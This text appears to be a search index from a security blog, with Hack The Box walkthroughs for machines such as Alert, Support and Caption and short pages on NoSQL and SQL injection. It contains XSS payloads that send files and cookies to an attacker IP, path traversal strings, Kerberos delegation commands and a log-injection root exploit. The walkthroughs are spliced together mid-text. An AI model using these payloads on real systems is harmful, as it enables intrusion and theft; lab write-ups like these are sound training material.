[{"content":" Reconnaissance \u0026amp; Enumeration # Started with an Nmap scan, revealing open ports: 22, 80. From the scan results I can also see 12227 port open which is also interesting. The scan results showed that Apache2 was hosting the website. The website featured a markdown reader page, The Basic functionality of this website is, get\u0026rsquo;s markdown file from the user and then reads the contents of the particular file for displaying it\u0026rsquo;s contents on the website. This website also included a share option for the rendered content. Again, it also has a simple contact form Now it should be obivious that this website uses HTML and JavaScript to render the contents like any other site on the internet I uploaded a .md file with JavaScript snippet init for testing, below were the contents of my md file\nAs expected the contents were rendered and loaded like this This is quite bad. It can execute arbitrary code as it renders the contents Exploitation # Also another functionality in this website is pretty straight forward, where in contact form whatever link is filled and sent seems to be clicked by an admin. We can easily get the admin\u0026rsquo;s cookie by making a .md file with malicious payload and by sharing the .md file link using the share option to the admin through the contact form. The admin will eventually click the link and it will make the code to execute on his browser potentially sending the cookie to us(Attacker). More dangerously we could also read arbitrary files using the message.php parameter So to exploit this LFI vulnerability I tried this payload and opened a nc on other side. \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=/etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; To trigger this payload, View it and use the share option and get the link, share it to the dumb admin via contact form. After many tries I got this correct I modified the payload accordingly to read the target file \u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../etc/passwd\u0026#34;).then(response =\u0026gt; response.text()) .then(data =\u0026gt; fetch(\u0026#34;http://10.10.14.12:6001\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data })); \u0026lt;/script\u0026gt; Found couple of users. Now the configs for apache2 running websites generally resides at /etc/apache2/sites-available/000-default.conf I learnt this from enumerating my own machine. After I modified the original payload to read this configuration file and I got the output. Got the .htpasswd location. Usually this file contains the passwords or hashes for apache2. Within that file password hash for user albert was there\nLet\u0026rsquo;s crack the hash I used hashcat to crack this hash hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 1600 --username Here I specified module 1600 to crack apache type hash and with as albert username is presented with the hash we have to specify --username flag Now I can use ssh to login as user albert We got the User flag Privilege Escalation # General SUID, SGID, Capabilities didn\u0026rsquo;t had anything promising But anyway there was a internal web service running on port 80 ss -tunlp so I tunneled it to my machine via ssh on port 2000. ssh -L 2000:localhost:8080 albert@alert.Hack The Box The web service name litterely websitemonitor which track and monitor the websites like alert.htb I found the website\u0026rsquo;s directory location at /opt/websitemonitor The configuration files for this website are stored within /config The the web root folder of this website has root privileges and Albert also have access to modify it. So to escalate my privileges I changed the file to a reverseshell. Eventually secured Root flag Summary # The \u0026ldquo;Alert\u0026rdquo; box was approached with an initial reconnaissance phase where an nmap scan revealed three open ports: SSH (port 22) and a web server (port 80). The web server was identified as running Apache2 and hosting a Markdown reader page.\nDuring the enumeration phase, it was discovered that the Markdown reader could execute code embedded within the Markdown content. Additionally, a contact form was found to be exploitable because the administrator would click on links sent through it without analyzing them, suggesting a potential Local File Inclusion (LFI) vulnerability. This LFI was exploited by crafting a payload and sending it to the admin via the contact form. This allowed for the discovery of user information and the location of the Apache2 configuration file, which contained the path to the .htpasswd file. The password hash for the user albert was found within this file.\nThe exploitation phase also involved cracking albert\u0026rsquo;s password hash using hashcat. The cracked password enabled successful SSH login, granting initial user access and the user flag.\nFor privilege escalation, an internal web service named \u0026ldquo;websitemonitor\u0026rdquo; was discovered running on port 8080. This port was tunneled to the attacker\u0026rsquo;s machine via SSH. The configuration files for \u0026ldquo;websitemonitor,\u0026rdquo; including the web root, were located in /opt/websitemonitor/config. As the user albert and root had permissions to modify files in the web directory,I replaced a file with a reverse shell, leading to root access and the acquisition of the root flag.\n","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1742495783286-alert-walkthroughhtb/","section":"Posts","summary":"","title":"Alert Walkthrough(Hack The Box)","type":"posts"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hacking/","section":"Tags","summary":"","title":"Hacking","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/","section":"Secure The Throne","summary":"","title":"Secure The Throne","type":"page"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/walkthrough/","section":"Tags","summary":"","title":"Walkthrough","type":"tags"},{"content":"","date":"22 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"20 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":" About # Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell.\nReconnaissance \u0026amp; Enumeration # Nmap scan results: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Jarmis |_http-favicon: Unknown favicon MD5: C92B85A5B907C70211F4EC25E29A8C4A |_http-server-header: nginx/1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD Device type: general purpose Running: Linux 4.X|5.X OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 OS details: Linux 4.15 - 5.19 Uptime guess: 1.433 days (since Thu Mar 13 07:56:57 2025) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=265 (Good luck!)

If we could get that request on listener then we could potentially modify it to use the exploit OMIGod(CVE-2021-38647).

After connecting to the share, an executable file is discovered that is used to query the machine\u0026amp;amp;amp;amp;#039;s LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called support is identified in the users list, and the info field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through SharpHound, and BloodHound reveals that the Shared Support Accounts group that the support user is a member of, has GenericAll privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as NT Authority\\System is received. Reconnaissance \u0026amp; Enumeration # The port scan reveals multiple open ports As always we got LDAP, Netbios, SMB etc ports open Using smbclient I enumerated for smb shares and we got the share list smbclient -L support.htb However the interesting share here is support-tools. Using netexec I confirmed the guest login and it was a success netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; I enumerated for guest shares and we got access to two shares netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; --shares So I checked the share support-tools and as the name suggests we got some tools inside the directory. Most of the tools are familiar to me aleast their names are familiar I decided to enumerate all the zips from the share. Initially the zips didn\u0026rsquo;t provide me with anything interesting so I moved on to enumerate LDAP. nmap -n -sV --script \u0026#34;ldap* and not brute\u0026#34; -p 389 support.htb Then I enumerated for users using netexec from smb and got the users list Removed all unwanted texts from the list cat users.txt | grep \u0026#34;SidTypeUser\u0026#34; | cut -d \u0026#39;\\\u0026#39; -f 2 | cut -d \u0026#39;(\u0026#39; -f 1 \u0026gt;\u0026gt; users-smb.txt I Stored the users in a file. UsersInfo.exe analysis # Remember the file UsersInfo.exe.zip that we have downloaded from SMB share. At first I didn\u0026rsquo;t notice it but after a while I was stuck and then I only I realized the unfamiliar tool among the known tools within the share On running UsersInfo.exe with wine I can see it, authenticate to ldap for retrieving the user that we requested by that this tool checks if that particular user available in the DC or not, then it returns the statement accordingly. For an example the tool returned me a error No such object meaning the requested user cannot be found within LDAP\nThis tool doesn\u0026rsquo;t use any encryption to login against LDAP thus leaves the password used for authentication in clear text .If I can capture the traffic in wireshark I can get the password. In the LDAP I can see it authenticate as user ldap with the password. As I got a username and password I can now collect data for bloodhound Getting data for Bloodhound Exploitation # If we search the results of ldapsearch , particularly in the info field I can get another password.

Follow the steps below carefully Required Tools PowersView.ps1 Powermad.ps1 Rubeus.exe(Pre build from SharpCollection) Step 1: Upload all the tools to the target system, then # Do the following in the winrm shell cd C:\\\\programdata\nupload PowersView.ps1\nupload Powermad.ps1\nupload Rubeus.exe\nStep 2: Invoking all the scripts # . .\\PowerView.ps1 . .\\Powermad.ps1 Step 3: Creating a Fake Computer # New-MachineAccount -MachineAccount \u0026lt;Computername\u0026gt; -Password $(ConvertTo-SecureString \u0026#39;\u0026lt;Password\u0026gt;\u0026#39; -AsPlainText -Force) We need SID of the computer that we have created earlier, so that we can assign that value to a variable $fakesid = Get-DomainComputer \u0026lt;Computername\u0026gt; | select -expand objectsid Step 4: Configuring # Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC Definition What is ACL? An ACL is a list of access control entries (ACEs) that define permissions for users or groups to access specific objects (like users, groups, computers, or organizational units) and their attributes. Purpose: ACLs ensure that only authorized users can access specific resources and perform specific actions, enhancing security and data protection.\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))\u0026#34; $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} Step 5: Auth as the Computer # .\\Rubeus.exe hash /password:\u0026lt;Password\u0026gt; /user:\u0026lt;ComputerName\u0026gt; /domain:support.htb Now copy the rc4_hmac hash from the output Step 6: Get the Kerberos Ticket # .\\Rubeus.exe s4u /user:\u0026lt;Computername\u0026gt;$ /rc4:\u0026lt;Hash\u0026gt; /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt Now ticket will be captured.

But at initially on seeing it I was happy cause I thought I could have command injection or something. But if you think about it which is unlikely now. After a while, I found that there is a cache server running along with the web server, which is called varnish, Actually we could\u0026rsquo;ve learned about this from the source code(repo) too Varnish Cache is a web application accelerator also known as a caching HTTP reverse proxy. You install it in front of any server that speaks HTTP and configure it to cache the contents.\nApparently this caching server will cache the same page for all users for quick loading of contents\nAgain after a while I found that when using X-Forwaded-Host: header on the request of pages like /home and /firewalls actually loads it\u0026rsquo;s value on the response and caches the same page for everyone(including admin) using varnish caching server. \u0026#34; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;new Image().src=\u0026#34;https://10.10.14.12:8000/?c=\u0026#34;+document.cookie;\u0026lt;/script\u0026gt; So I made and used the the above xss payload to get admin cookie which was successful. Even after including the admin cookie, still haproxy blocking my request to the page /logs which was frustrating I was searching for a tool to bypass this, fortunatly one friend suggested me this great tool called h2csmuggler and using that tool I was easily able to bypass the 403 of /logs From the response I got the location of logs files After hours of checking the logs files, I came to know that it didn\u0026rsquo;t has anything useful, Full of garbage h2csmuggler.py -x http://caption.htb:80 -H \u0026#39;Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzM1NDY5NTAzfQ.KlugtV3zNPowolIMi0EUkDB_CFUx0MdmDSkNWEX1KHo\u0026#39; \u0026#39;http://caption.htb:80/download\u0026lt;redacted\u0026gt; See it\u0026rsquo;s garbage contents yourselves But on visiting the plain url without the logs path it rather reveals something interesting These ./cpr folders are looking interesting aren\u0026rsquo;t they Researched about them and found a vulnerability in copyparty, Which includes a path traversal vulnerability on versions 1.8.2 The POC looked like this: curl -i -s -k -X GET \u0026#39;http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd\u0026#39; The above path also has SSRF vulnerability Exploitation # Using this plainly didn\u0026rsquo;t work for me But with little twerk, actually have to double encode the payload This was my initial payload to read /etc/passwd .cpr//etc/passwd The Final URL encoded payload: %2e%63%70%72%2f%25%32%46%65%74%63%25%32%46%70%61%73%73%77%64 As this was working, for SSH access I tried to read id_rsa for user margo and got nothing, then after some hours I figured that it\u0026rsquo;s not a RSA key that I should look for\u0026hellip; /.cpr//home/margo/.ssh/id_ecdsa Logged in with the key and got the User flag Don\u0026rsquo;t worry guys we are halfway through Privilege Escalation # I started enumerating with internal services and we got multiple services but one looks particularly interesting ss -tunlp The reason is, there is a code mentioning about port 9090 within the gitbucket\u0026rsquo;s Logservice repo So as usual as I reverse forwarded that particular service port to my host machine There were no interface I was stuck here so I researched the repo again and learned about Thrift. Where Thrift is used to connect with log services. Researched on Thrift View articles Link-1 Link-2\nAlso after some further enumeration and code review I found a really bad code on the log service This regex code snippet reads a arbitary log file and takes the values of User-Agent from, it takes timestamp\u0026rsquo;s value. Also it notes the IP address which is not potential for this context This can be exploited by injecting a command within the user agent of log files. As the code configured to read the user-agent value, the injected command would be executed. For this to be done we need Thrift installed on the local machine. Then we need a client on the local machine to tell the Log service to read our malicious file on the target using thrift. When it reads the log file our command will be executed. So I installed Thrift using pip3 pip3 install thrift To create the client, first we have to create an api configuration file for the client Created a file named api2.thrift with this following code namespace py log_service exception LogServiceException { 1: string message } service LogService { /** * Reads the log file from the specified file path. * @param filePath - The path of the log file to read. * @return string - A message indicating the processing status. * @throws LogServiceException - If an error occurs during processing. */ string ReadLogFile(1: string filePath) throws (1: LogServiceException error) } Installed compiler using sudo apt install thrift-compiler although not recommended Ran the following command and created modules directory in python language thrift --gen py api2.thrift Inside the directory I created client.py file with this code from thrift import Thrift from thrift.transport import TSocket from thrift.transport import TTransport from thrift.protocol import TBinaryProtocol from log_service import LogService # Import generated Thrift client code def main(): # Set up a transport to the server transport = TSocket.TSocket(\u0026#39;localhost\u0026#39;, 9090) # Buffering for performance transport = TTransport.TBufferedTransport(transport) # Using a binary protocol protocol = TBinaryProtocol.TBinaryProtocol(transport) # Create a client to use the service client = LogService.Client(protocol) # Open the connection transport.open() try: # Specify the log file path to process log_file_path = \u0026#34;/tmp/bad.log\u0026#34; # Call the remote method ReadLogFile and get the result response = client.ReadLogFile(log_file_path) print(\u0026#34;Server response:\u0026#34;, response) except Thrift.TException as tx: print(f\u0026#34;Thrift exception: {tx}\u0026#34;) # Close the transport transport.close() if __name__ == \u0026#39;__main__\u0026#39;: main() After that I created two files One is bad.log file with this as content 999.9.9.9 \u0026#34;user-agent\u0026#34;:\u0026#34;\u0026#39;; /bin/bash /tmp/bad.sh #\u0026#34; Second is bad.sh file with this chmod +s /bin/bash Transferred both the files to the /tmp folder of the target system and also gave appropriate permissions From the host hosted a python server From the target system All complications are over. By now if client.py is executed it will speak with the Log-service and make it to read the file /tmp/bad.log As the file contains malicious code. It will make the Log-service to execute a script named bad.sh as root. The script will give SUID permissions to /bin/bash making it to be executed as root by anyone. Fired the script successfully Our exploit worked\u0026hellip;. It was a success Executing the /bin/bash with preserve flag -p gave a shell as root. Finally got the Root flag Feedback: This box was awesome at same time it was a misery. It took me 5 days to pwn this box.

But one in particular /docs asks for authentication cookie. We can also do directory fuzzing in recursive mode with any tool but I personally found the endpoints just by guessing them. There is one signup endpoint which is api/v1/user/signup. Using this endpoint I can create an account. After enumerating further on that endpoint I found all the data parameters of it. Now I can create an account using this curl -v -X POST \u0026#39;http://10.10.11.161/api/v1/user/signup\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;email\u0026#34;:\u0026#34;Emp5r0R@king.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;}\u0026#39; | jq Eventually I found another endpoint which is /login. But initially it was showing error on sending the json data but it turns out this endpoint only accept HTML data. I curled the endpoint curl -v \u0026#39;http://10.10.11.161/api/v1/user/login\u0026#39; -d \u0026#39;username=Emp5r0R@king.com\u0026amp;password=password\u0026#39; | jq .

Tested 8 usernames (6 valid) in 0.198 seconds Exploitation # As I was desperatly looking for a low hanging fruit I checked user accounts that had DONT_REQUIRE_PREAUTH. Lucky me I got one user which is none other than svc-alfresco. This Pre-Auth concept is pretty simple let\u0026rsquo;s learn about it, As part of the Kerberos authentication process in Active Directory, there is an initial request to authenticate without a password. This is an artifact left over from Kerberos versions earlier than Kerberos 5. In these earlier versions, Kerberos would allow authentication without a password. Now, in Kerberos 5, a password is required, which is called “Pre-Authentication.” When looking at the Kerberos exchanges during log-on, you will initially see an AS-REQ (Authentication Server Request) followed by a Kerberos error, which will state that pre-auth is required. But in some cases accounts might be configured to authenticate without a Pre-Auth, well yeah which obiviously a misconfiguration.

Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.\nDue to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.\nThere are 4 common storage models for NoSQL databases:\nKey-Value Document-Based Wide-Column Graph Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:\ngraph LR subgraph Posts box1[id\ndate\ncontent] box2[id\ndate\ncontent] box3[id\ndate\ncontent] end box1 --\u003e Key1[Key] box1 --\u003e Value1[Value] box2 --\u003e Key2[Key] box2 --\u003e Value2[Value] box3 --\u003e Key3[Key] box3 --\u003e Value3[Value] The above example can be represented using JSON as follows: { \u0026#34;100001\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;01-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Welcome to this web application.\u0026#34; }, \u0026#34;100002\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;This is the first post on this web app.\u0026#34; }, \u0026#34;100003\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Reminder: Tomorrow is the ...\u0026#34; } } It looks similar to a dictionary/map/key-value pair in languages like Python or PHP \u0026lsquo;i.e. {'key':'value'}\u0026rsquo;, where the key is usually a string, the value can be a string, dictionary, or any class object.\nThe Document-Based model stores data in complex JSON objects and each object has certain meta-data while storing the rest of the data similarly to the Key-Value model.\nSome of the most common NoSQL databases include:\nType Description MongoDB The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects ElasticSearch Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient Apache Cassandra Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values Other common NoSQL databases include: Redis, Neo4j, CouchDB, and Amazon DynamoDB.

Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.\nFor example, in the database section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:\n$query = \u0026#34;select * from users where name like \u0026#39;%$searchInput%\u0026#39;\u0026#34;; If the user input is not properly filtered and validated (as is the case with Command Injections), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.\nFor example, the same previous College Management System 1.2 suffers from a SQL injection vulnerability, in which we can execute another SQL query that always returns true, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.\n","date":"7 March 2025","externalUrl":null,"permalink":"/Secure-The-Throne/posts/1741343014156-sql-injection/","section":"Posts","summary":"","title":"SQl-Injection","type":"posts"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/Secure-The-Throne/series/","section":"Series","summary":"","title":"Series","type":"series"}]
